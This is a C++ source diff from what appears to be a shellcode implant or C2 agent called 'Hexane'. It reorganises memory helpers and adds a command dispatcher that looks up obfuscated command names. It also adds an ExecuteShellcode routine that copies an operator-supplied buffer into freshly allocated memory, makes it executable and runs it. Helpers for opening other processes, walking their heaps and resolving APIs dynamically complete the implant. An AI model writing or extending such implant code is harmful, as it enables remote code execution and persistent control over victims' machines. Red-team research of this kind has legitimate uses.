@@ -4,68 +4,84 @@
 #endif
 
 namespace Memory {
-    UINT_PTR GetStackCookie() {
-        HEXANE
+    namespace Methods {
 
-        uintptr_t cookie = 0;
-        if (!NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
-            cookie = 0;
-        }
+        UINT_PTR GetStackCookie() {
+            HEXANE
 
-        return cookie;
-    }
-
-    VOID GetProcessHeaps(void* process, uint32_t access, uint32_t pid) {
-        HEXANE
-
-        HANDLE snap = { };
-        HEAPLIST32 heaps = {};
-        heaps.dwSize = sizeof(HEAPLIST32);
-
-        if (!NT_SUCCESS(Process::NtOpenProcess(&process, access, pid))) {
-            return;
-        }
-
-        snap = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPHEAPLIST, pid);
-        if (snap == INVALID_HANDLE_VALUE) {
-            return;
-        }
-
-        if (Heap32ListFirst(snap, &heaps)) {
-            do {
-                //_heap_info heap_info = {heaps.th32HeapID, heaps.th32ProcessID};
-                //m_heaps.push_back(heap_info);
+            uintptr_t cookie = 0;
+            if (!NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
+                cookie = 0;
             }
-            while (Heap32ListNext(snap, &heaps));
-        }
-    }
 
-    _resource* GetIntResource(HMODULE base, const int rsrc_id) {
-        HEXANE
-
-        HRSRC hResInfo = { };
-        _resource* Object = { };
-
-        Object = S_CAST(_resource*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_resource)));
-        if (
-            !(hResInfo          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA)) ||
-            !(Object->hGlobal   = Ctx->win32.LoadResource(base, hResInfo)) ||
-            !(Object->Size      = Ctx->win32.SizeofResource(base, hResInfo)) ||
-            !(Object->ResLock   = Ctx->win32.LockResource(Object->hGlobal))) {
-
-            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Object);
-            return nullptr;
+            return cookie;
         }
 
-        return Object;
+        VOID GetProcessHeaps(void* process, const uint32_t access, const uint32_t pid) {
+            HEXANE
+
+            HANDLE snap = { };
+            HEAPLIST32 heaps = {};
+            heaps.dwSize = sizeof(HEAPLIST32);
+
+            if (!NT_SUCCESS(Process::NtOpenProcess(&process, access, pid))) {
+                return;
+            }
+
+            snap = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPHEAPLIST, pid);
+            if (snap == INVALID_HANDLE_VALUE) {
+                return;
+            }
+
+            if (Heap32ListFirst(snap, &heaps)) {
+                do {
+                    //_heap_info heap_info = {heaps.th32HeapID, heaps.th32ProcessID};
+                    //m_heaps.push_back(heap_info);
+                }
+                while (Heap32ListNext(snap, &heaps));
+            }
+        }
+
+        _resource* GetIntResource(HMODULE base, const int rsrc_id) {
+            HEXANE
+
+            HRSRC hResInfo = { };
+            _resource* Object = { };
+
+            Object = S_CAST(_resource*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_resource)));
+            if (
+                !(hResInfo          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA)) ||
+                !(Object->hGlobal   = Ctx->win32.LoadResource(base, hResInfo)) ||
+                !(Object->Size      = Ctx->win32.SizeofResource(base, hResInfo)) ||
+                !(Object->ResLock   = Ctx->win32.LockResource(Object->hGlobal))) {
+
+                Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Object);
+                return nullptr;
+            }
+
+            return Object;
+        }
+
+        _executable* CreateImageData(uint8_t *data) {
+            HEXANE
+
+            _executable *image = R_CAST(_executable*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_executable)));
+
+            image->buffer = data;
+            image->dos_head = IMAGE_DOS_HEADER(image->buffer);
+            image->nt_head = IMAGE_NT_HEADERS(image->buffer, image->dos_head);
+
+            return image;
+        }
     }
 
     namespace Context {
         VOID ResolveApi() {
             HEXANE
-            OSVERSIONINFOW OSVersionW = {};
 
+            OSVERSIONINFOW OSVersionW = { };
             x_memset(&Ctx->LE, ENDIANESS, 1);
+
             if (!(Ctx->Modules.kernel32 = M_PTR(KERNEL32))) {
                 return_defer(ERROR_PROC_NOT_FOUND);
             }
@@ -191,16 +207,16 @@ namespace Memory {
                 !(F_PTR_HMOD(Ctx->win32.PeekNamedPipe, Ctx->Modules.kernel32, PEEKNAMEDPIPE))) {
                 return_defer(ERROR_PROC_NOT_FOUND);
             }
-        defer:
+            defer:
 
         }
 
         VOID ContextInit() {
             // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
 
-            _hexane instance = {};
-            LPVOID region = {};
-            SIZE_T region_size = 0;
+            _hexane instance = { };
+            size_t region_size = 0;
+            void *region = { };
 
             instance.Teb = NtCurrentTeb();
             instance.Heap = instance.Teb->ProcessEnvironmentBlock->ProcessHeap;
@@ -242,6 +258,33 @@ namespace Memory {
             if (RtlFreeHeap) {
                 RtlFreeHeap(Heap, 0, Ctx);
             }
+        }
+    }
+
+    namespace Objects {
+        _command GetInternalAddress(const char* id, bool* internal) {
+            HEXANE
+
+            _command address = { };
+            *internal = FALSE;
+
+            if (id == OBF("null")) {
+                goto defer;
+            }
+
+            for (auto i = 0 ;; i++) {
+                if (!cmd_map[i].name) {
+                    return_defer(ERROR_PROC_NOT_FOUND);
+                }
+
+                if (cmd_map[i].name == id) {
+                   *internal = TRUE;
+                   address = R_CAST(void(*)(_parser*), Ctx->Base.Address + U_PTR(cmd_map[i].address));
+                }
+            }
+
+            defer:
+            return address;
         }
     }
 
@@ -327,7 +370,7 @@ namespace Memory {
                     reload++;
                 }
             }
-        defer:
+            defer:
             return address;
         }
     }
@@ -382,6 +425,52 @@ namespace Memory {
             Ctx->Nt.RtlFreeHeap(GetProcessHeap(), 0, buffer);
 
             return address;
+        }
+    }
+
+    namespace Execute {
+        VOID ExecuteCommand(_parser &parser) {
+            HEXANE
+
+            _command cmd        = { };
+            bool is_internal    = false;
+            const auto cmd_id   = Parser::UnpackString(&parser, nullptr);
+
+            if (!(cmd = Memory::Objects::GetInternalAddress(cmd_id, &is_internal)) || !is_internal) {
+                return_defer(ntstatus);
+            }
+
+            cmd(&parser);
+            defer:
+        }
+
+        VOID ExecuteShellcode(_parser &parser) {
+            HEXANE
+
+            void *exec  = { };
+            void (*cmd)(_parser*) = { };
+            size_t size = parser.Length;
+
+            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+                return_defer(ntstatus);
+            }
+
+            x_memcpy(exec, parser.Buffer, parser.Length);
+            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), &exec, &size, PAGE_EXECUTE_READ, nullptr))) {
+                return_defer(ntstatus);
+            }
+
+            cmd = R_CAST(void(*)(_parser*), exec);
+            cmd(&parser);
+
+            x_memset(exec, 0, size);
+
+            defer:
+            if (exec) {
+                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &exec, &size, MEM_FREE))) {
+                    return_defer(ntstatus);
+                }
+            }
         }
     }
 }
